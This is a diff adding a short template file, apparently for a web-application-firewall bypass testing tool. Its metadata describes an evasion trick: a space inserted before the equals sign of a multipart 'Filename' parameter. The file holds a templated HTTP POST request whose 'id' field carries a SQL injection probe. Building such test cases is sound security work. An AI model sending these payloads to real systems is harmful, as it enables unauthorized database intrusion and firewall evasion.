@@ -1,0 +1,18 @@
+# @name: do9gy的宝藏规则filename\x20=
+# @color: yellow
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @tags: multipart Filename参数等号前插入空格绕过
+# @intent: filename_space_before_eq
+# @intent.replace_from: Filename=
+# @intent.replace_to: "Filename ="
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="id";Filename ="1.jpg"
+
+1' and 'a'='a
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
